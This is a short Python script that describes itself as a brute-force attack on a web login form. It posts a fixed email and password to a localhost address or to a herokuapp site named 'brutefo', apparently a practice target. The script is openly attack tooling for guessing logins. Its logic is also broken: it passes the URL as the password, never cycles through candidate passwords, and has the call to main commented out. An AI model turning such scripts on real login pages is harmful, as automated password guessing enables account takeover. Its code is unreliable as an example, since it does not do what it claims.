#!/usr/bin/env python3
import requests
import time
import sys

try:
    if sys.argv[1]:
        url = 'http://localhost:8080/'  # test on localhost
except Exception:
    url = 'http://brutefo.herokuapp.com/'


headers = {'User-Agent': 'Mozilla'}
data = {
    'email': 'test@gmail.com',
    'password': '~5_pFO*p6s8Kcj+U'
}
sess = requests.Session()
sess.headers['User-Agent'] = 'Mozilla'


def load_page(password=''):
    ' Send POST request with password '
    global url  # declaring as global variables
    global headers
    global data
    for attempt in range(5):
        try:
            data['password'] = password
            res = sess.post(url, data=data, )
                # headers=headers)
            # if successfully posted, return result
            return res.text
        except Exception:
            pass  # if fail to post, retry


def main():
    ' Perform Brute force attack '
    res = ''
    while 'successful' not in res:
        res = load_page(url)


if __name__ == '__main__':
    1 #main()
